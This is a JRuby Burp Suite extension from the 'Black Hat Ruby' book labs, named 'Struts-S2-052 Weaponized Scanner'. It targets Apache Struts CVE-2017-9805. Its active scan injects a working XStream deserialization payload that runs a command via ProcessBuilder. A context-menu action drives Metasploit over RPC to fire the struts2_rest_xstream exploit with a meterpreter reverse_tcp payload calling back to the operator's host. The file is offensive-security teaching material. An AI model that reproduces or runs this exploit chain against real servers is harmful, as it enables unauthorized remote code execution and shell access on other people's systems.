#!/usr/bin/env jruby-complete-9.2.4.0.jar
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   Burp extension to actively and passively scan and exploit (metasploit) Struts-S2-052 (CVE-2017-9805)
# Requirements:
#   jruby | jruby-code-xxx-complete.jar
#   java -jar jruby-complete-9.2.4.0.jar -S gem install --user-install msfrpc-client
#   java -jar jruby-complete-9.2.4.0.jar -S gem install --user-install msgpack
#   Burp Suite
#   Metasploit (run the msf-RPC server on metasploit before loading the extension)
#   $ msfconsole
#   msf > load msgrpc ServerHost='0.0.0.0' ServerPort=55553 User=bhr Pass='BHRuby' SSL=true
#   [*] MSGRPC Service:  0.0.0.0:55553
#   [*] MSGRPC Username: bhr
#   [*] MSGRPC Password: BHRuby!!
#   [*] Successfully loaded plugin: msgrpc
#
#   Then edit '@srv_opts' variable (:host key's value) with the correct Metasploit server IP address
# 
require 'java'
require 'msgpack'
require 'msfrpc-client'

module JPackages
  # Java's Interfaces
  include_package javax.swing
  include_package java.awt
  # Burp's Interfaces
  include_package 'burp'
  include IBurpExtender
  include IRequestInfo
  include IScannerCheck
  include IScanIssue
  include IContextMenuFactory
  include IContextMenuInvocation
end

class Object
  def self.const_missing(class_name) JPackages.const_get(class_name); end
end

module GUI
  include JPackages

  # showMessageDialog is an wrapper for 'JOptionPane.showMessageDialog' to popup a message box
  #
  # @param opts [Hash]
  #   @option opts Nil
  #   @option opts :message [String]
  #   @option opts :title [String]
  #   @option opts :level [String]
  #                      Levels:
  #                        default                     = 1
  #                        JOptionPane.WARNING_MESSAGE = 2
  #                        JOptionPane.ERROR_MESSAGE   = 3
  #                        JOptionPane.PLAIN_MESSAGE   = 4
  def showMessageDialog(opts={})
    JPackages::JOptionPane.showMessageDialog(nil, opts[:message], opts[:title], opts[:level])
  end
end

class Exploit
  attr_accessor :rhost,      :rport,   :targeturi,
                :ssl,        :srvhost, :srvport,
                :user_agent, :target,  :payload,
                :lhost,      :lport
  attr_reader   :sessions,   :session, :srv_opts

  def initialize
    @rhost      = 'localhost'
    @rport      = 8080
    @targeturi  = '/struts2-rest/orders/3'
    @ssl        = false
    @srvhost    = '0.0.0.0'
    @srvport    = 8081
    @user_agent = 'Black Hat Ruby'
    @target     = 0
  end

  # make sure msfrpc server is running before loading the extention
  #
  # $ msfconsole
  # msf > load msgrpc ServerHost='0.0.0.0' ServerPort=55553 User=bhr Pass='BHRuby' SSL=true
  # [*] MSGRPC Service:  0.0.0.0:55553
  # [*] MSGRPC Username: bhr
  # [*] MSGRPC Password: BHRuby!!
  # [*] Successfully loaded plugin: msgrpc
  def connect
    puts "[*] Connecting to MSFRPC Server.."
    user = 'bhr'
    pass = 'BHRuby'
    @srv_opts = {
      host: '192.168.100.115',#'192.168.100.10', # Edit this with your Metaploit IP address
      port: 55553,
      uri:  '/api/',
      ssl:  true
    }
    @rpc = Msf::RPC::Client.new(@srv_opts)
    connected = @rpc.login(user, pass)
    if connected 
      puts "[+] Connected to MSFRPC Server!" if connected
      puts " - User: #{user}"
      puts " - Pass: #{pass}"
      puts " - host: #{@srv_opts[:host]}"
      puts " - port: #{@srv_opts[:port]}"
      puts " - uri : #{@srv_opts[:uri]}"
      puts " - ssl : #{@srv_opts[:ssl]}"
    end
    return connected
  rescue Msf::RPC::ServerException => e
    puts "[!] Connection failed to MSFRPC Server."
    # puts e.full_message
    puts "[!] Make sure that the extention has the correct IP address for Metasploit RPC server, check '@srv_opts' variable (:host key's value)"
    puts "[!] Make sure that the msfrpc server is running on Metasploit then reload the extension!"
    puts "$ msfconsole"
    puts "msf > load msgrpc ServerHost='0.0.0.0' ServerPort=55553 User=bhr Pass='BHRuby' SSL=true"
    puts "[*] MSGRPC Service:  0.0.0.0:55553"
    puts "[*] MSGRPC Username: bhr"
    puts "[*] MSGRPC Password: BHRuby!!"
    puts "[*] Successfully loaded plugin: msgrpc"
    return false
  end

  def struts2_rest_xstream
    puts "[*] Exploiting struts2_rest_xstream"
    exp_opts = {
      'RHOST'     => @rhost,
      'RPORT'     => @rport,
      'TARGETURI' => @targeturi,
      'SSL'       => @ssl,
      'SRVHOST'   => @srvhost,
      'SRVPORT'   => @srvport,
      'UserAgent' => @user_agent,
      'target'    => @target
    }
    pay_opts = {
      'PAYLOAD' => @payload,
      'LHOST'   => @lhost,
      'LPORT'   => @lport
    }
    job = @rpc.call('module.execute', 'exploit', 'multi/http/struts2_rest_xstream', exp_opts.merge(pay_opts))
    @session  = job['job_id']

    if @session
      puts "[+] A new session has been created!"
      @rpc.call('session.meterpreter_write', @session, "sysinfo")
      @rpc.call('session.meterpreter_read',  @session)
    else
      puts "[*] No session! struts2_rest_xstream"
    end
  end
end

class BurpExtender
  include JPackages
  include GUI

  def registerExtenderCallbacks(callbacks)
    @callbacks = callbacks
    @helpers   = callbacks.getHelpers
    @callbacks.setExtensionName("Struts-S2-052 Weaponized Scanner")
    @callbacks.registerContextMenuFactory(self)
    @callbacks.registerScannerCheck(self)

    @exploit       = Exploit.new
    @rpc_connected = @exploit.connect
  end

  # context menu should appears only in
  #   - request edtor
  #   - request history
  #   - site map
  #  also check if the url is vulnerable before sending it to metasploit if vulnerable?
  def createMenuItems(invocation)
    req_res = invocation.getSelectedMessages()[0]
    analysis = @helpers.analyzeRequest(req_res)
    uri = URI.parse(analysis.getUrl.to_s)

    msf_ctx_menu = JMenuItem.new("<html><b>Send 'CVE-2017-9805' to Metasploit</b></html>")
    msf_ctx_menu.addActionListener {
      if @rpc_connected && invocation.invocation_context == 4
        @exploit.rhost      = uri.host
        @exploit.rport      = uri.port
        @exploit.targeturi  = uri.request_uri
        @exploit.ssl        = uri.scheme.include?("https") ? true : false
        @exploit.srvhost    = '0.0.0.0'
        @exploit.srvport    = 8081
        @exploit.user_agent = 'Black Hat Ruby'
        @exploit.target     = 4
        @exploit.payload    = 'linux/x86/meterpreter/reverse_tcp'
        @exploit.lhost      = @exploit.srv_opts[:host]
        @exploit.lport      = 9911

        sysinfo = @exploit.struts2_rest_xstream.map {|k, v| "#{k}: #{v}"}.join("\n")
        showMessageDialog({title: "Exploited!",
          message: "w00t! You have a new meterpreter session.\n" +
                   "#{sysinfo}\n" +
                   "Please go to your msfconsole:\n" +
                   "msf > session -i #{@exploit.session + 1}",
          level: 1})
      else
        showMessageDialog({title: 'MSFRPC Error!',
          message: "Failed to connect to Metasploit's RPC Server. " +
                   "Please Make you sure the server is running:\n" +
                   "$ msfconsole\n" +
                   "msf > load msgrpc ServerHost=0.0.0.0 ServerPort=55553 User=bhr Pass='BHRuby!!' SSL=true\n\n" +
                   "Note: I'll try to reconnect again after you press OK button",
          level: 0})
          @rpc_connected = @exploit.connect # try to connect again
      end
    }

    [msf_ctx_menu]
  end

  # doPassiveScan is a method for IScannerCheck interface which burp is going
  # to look for when IScannerCheck is included
  # https://portswigger.net/burp/extender/api/burp/IScannerCheck.html#doPassiveScan(burp.IHttpRequestResponse)
  #
  # Here we want to build a passive scan than does the following:
  #   - Check each response comes to the proxy -or repeater, intruder (need to be configured)-
  #   - Create an issue if a the response body contains a specific string.
  #   - The issue should contains the following:
  #     - the issue name plus 'Passive Scan' to let us know it's from the passive scan
  #     - the issue confidence to be 'Firm' if target is vulnerable
  #
  # @param [IHttpRequestResponse] base_req_res
  #   Burp is going to pass IHttpRequestResponse object to #doPassiveScan method by default
  #
  # @return [Array<IScanIssue>] of issues
  def doPassiveScan(base_req_res)
    issues = []
    # report the issue
    if base_req_res.getResponse && Struts2.vulnerable?(base_req_res, @helpers)
      struts = Struts2.new(base_req_res, @helpers)
      struts.name       = 'Passive Scan'
      struts.confidence = 'Firm'
      issues.push(struts.to_java(IScanIssue))
    end

    return issues
  rescue Exception => e
    pp e.full_message
  end

  # doActiveScan is a method for IScannerCheck interface which burp is going
  # to look for when IScannerCheck is included
  # https://portswigger.net/burp/extender/api/burp/IScannerCheck.html#doActiveScan(burp.IHttpRequestResponse,%20burp.IScannerInsertionPoint)
  #
  # Here we want to build an active scan than does the following:
  #   - Create a POST request
  #   - Inject our payload in every insertionpoint for each request
  #   - Create an issue if a the response body contains a specific string.
  #   - The issue should contains the following:
  #     - the issue name plus 'Active Scan' to let us know it's from the passive scan
  #     - the issue confidence to be 'Certain' if target is vulnerable
  #
  # @param [IHttpRequestResponse] base_req_res
  #   Burp is going to pass IHttpRequestResponse object to #doActiveScan method by default
  # @param [IScannerInsertionPoint] insertion_point
  #   Burp is going to pass IScannerInsertionPoint object to #doActiveScan method by default
  #
  # @return [Array<IScanIssue>] of issues
  def doActiveScan(base_req_res, insertion_point)
    issues       = []
    analyzed_req = @helpers.analyzeRequest(base_req_res)

    if analyzed_req.getMethod == 'POST'
      headers      = analyzed_req.getHeaders.to_a
      cti          = headers.find_index {|h| h.include?('Content-Type')}
      headers[cti] = 'Content-type: application/xml'

      evil_payload  = Struts2.payload.bytes
      evil_http_msg = @helpers.buildHttpMessage(headers, evil_payload)
      evil_req_res  = @callbacks.makeHttpRequest(base_req_res.getHttpService, evil_http_msg)

      return nil unless Struts2.vulnerable?(evil_req_res, @helpers)

      struts2 = Struts2.new(evil_req_res, @helpers)
      struts2.name       = 'Active Scan'
      struts2.confidence = 'Certain'
      issues.push(struts2.to_java(IScanIssue))
    end

    return issues
  rescue Exception => e
    pp e.full_message
  end

  # handels the issue dubplication.
  #   It adds the issue if not exists or romove it othwerwise.
  #
  # @param [IScanIssue] existingIssue
  # @param [IScanIssue] newIssue
  #
  # @return [Integer]
  def consolidateDuplicateIssues(existingIssue, newIssue)
    existingIssue.getIssueName == newIssue.getIssueName ? -1 : 0
  end

  # find_matches finds all matches in a response bytes.
  # @param [Array<Integer>] response
  #   an array of bytes which represent the reponse string
  # @param [Array<Integer>] match
  #   an array of bytes which represent the string we are looking for in the response's bytes
  #
  # @return [Array] of matches
  def find_matches(response, match)
    matches = []
    offset  = 0

    while offset < response.length
      offset = @helpers.indexOf(response, match, true, offset, response.length)
      return if offset.negative? # -1 means no match
      matches.push([offset, offset + match.length].to_java(:int))
      offset += match.length
    end

    return matches
  end
end

#
# The issue(vulnerability) class which contains all related information and core functionality.
# The explicitely named methods are required by [IScanIssue] interface when
#  creating/reporting an issue to the vulnerable target dashboard.
# https://portswigger.net/burp/extender/api/burp/IScanIssue.html
#
class Struts2

  def self.payload
    <<~PAY
    <map>
      <entry>
          <jdk.nashorn.internal.objects.NativeString>
            <flags>0</flags>
            <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
                <dataHandler>
                  <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                      <is class="javax.crypto.CipherInputStream">
                        <cipher class="javax.crypto.NullCipher">
                            <initialized>false</initialized>
                            <opmode>0</opmode>
                            <serviceIterator class="javax.imageio.spi.FilterIterator">
                              <iter class="javax.imageio.spi.FilterIterator">
                                  <iter class="java.util.Collections$EmptyIterator" />
                                  <next class="java.lang.ProcessBuilder">
                                    <command>
                                      <string>whoami</string>
                                    </command>
                                    <redirectErrorStream>false</redirectErrorStream>
                                  </next>
                              </iter>
                              <filter class="javax.imageio.ImageIO$ContainsFilter">
                                  <method>
                                    <class>java.lang.ProcessBuilder</class>
                                    <name>start</name>
                                    <parameter-types />
                                  </method>
                                  <name>BHR</name>
                              </filter>
                              <next class="string">BHR</next>
                            </serviceIterator>
                            <lock />
                        </cipher>
                        <input class="java.lang.ProcessBuilder$NullInputStream" />
                        <ibuffer />
                        <done>false</done>
                        <ostart>0</ostart>
                        <ofinish>0</ofinish>
                        <closed>false</closed>
                      </is>
                      <consumed>false</consumed>
                  </dataSource>
                  <transferFlavors />
                </dataHandler>
                <dataLen>0</dataLen>
            </value>
          </jdk.nashorn.internal.objects.NativeString>
          <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString" />
      </entry>
      <entry>
          <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString" />
          <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString" />
      </entry>
    </map>
    PAY

  end

  def self.vulnerable?(base_req_res, helpers)
    response = base_req_res.getResponse
    success  = 'java.lang.String cannot be cast to java.security.Provider$Service'.bytes.freeze
    search   = helpers.indexOf(response, success, true, 0, response.length)
    search.positive? ? true : false
  rescue Exception => e
    pp e.full_message
  end

  attr_accessor :name, :url, :type, :severity, :confidence,
                :background, :remediation_background, :detail,
                :remediation_detail, :http_messages, :http_service

  def initialize(base_req_res, helpers)
    @base_req_res = base_req_res
    @helpers             = helpers
  end

  def getUrl
    @url = @helpers.analyzeRequest(@base_req_res).getUrl
  rescue Exception => e
    pp e.full_message
  end

  def getIssueName
    @name = 'BHR | Struts-S2-052 (CVE-2017-9805)' + " | #{@name.to_s}"
  end

  def getIssueType
    @type = 0x00101101
  end

  # "High", "Medium", "Low", "Information" or "False positive"
  def getSeverity
    @severity = @severity || 'High'
  end

  # "Certain", "Firm" or "Tentative"
  def getConfidence
    @confidence = @confidence || "Tentative"
  end

  def getIssueDetail
    @detail = "The response contains the string: 'java.lang.String cannot be cast to java.security.Provider$Service'"
  end

  def getIssueBackground
    @issue_background = <<~EOF
        The REST Plugin is using a XStreamHandler with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads.
        It is possible that some REST actions stop working because of applied default restrictions on available classes. In such case please investigate the new interfaces that was introduced to allow define class restrictions per action, those interfaces are:
          <ul>
            <li>org.apache.struts2.rest.handler.AllowedClasses</li>
            <li>org.apache.struts2.rest.handler.AllowedClassNames</li>
            <li>org.apache.struts2.rest.handler.XStreamPermissionProvider</li>
          </ul>
      EOF
  end

  # def getRemediationDetail
  #   @remediation_detail = <<~EOF
  #     Upgrade to Apache Struts version 2.5.13 or 2.3.34.
  #   EOF
  # end

  def getRemediationBackground
    @remediation_background = <<~EOF
      Upgrade to Apache Struts version 2.5.13 or 2.3.34.<br>
      <b>References</b><br>
      <ul>
        <li>https://cwiki.apache.org/confluence/display/WW/S2-052</li>
      </ul>
      <b>Vulnerability classifications</b><br>
      <ul>
        <li>CWE-502: Deserialization of Untrusted Data</li>
      </ul>
    EOF
  end

  def getHttpMessages
    @http_messages = @base_req_res.is_a?(Array) ? @base_req_res : [@base_req_res]
  rescue Exception => e
    pp e.full_message
  end

  def getHttpService
    @http_service = @base_req_res.getHttpService
  rescue Exception => e
    pp e.full_message
  end
end
